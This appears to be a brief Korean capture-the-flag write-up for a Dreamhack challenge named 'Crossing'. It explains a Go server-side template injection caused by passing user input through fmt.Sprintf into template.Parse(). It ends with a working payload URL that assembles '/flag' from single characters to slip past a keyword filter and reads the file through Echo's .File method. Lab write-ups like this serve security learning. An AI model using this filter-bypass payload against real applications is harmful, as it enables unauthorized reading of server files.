### Crossing

1. STI(Server Template Injection) 문제

- 문제점: fmt.Sprintf로 문자열에 유저 입력을 직접 삽입하고, template.Parse() 호출
- Go Tmeplate의 문법이 실행될 수 있어서 STI 발생!

2. Go의 Echo 템플릿 활용, File 명령을 통해 flag 필터링 우회

```bash
http://host8.dreamhack.games:15033/?name={{$s:="/"}}{{$f:="f"}}{{$l:="l"}}{{$a:="a"}}{{$g:="g"}}{{.File (print $s $f $l $a $g)}}
```
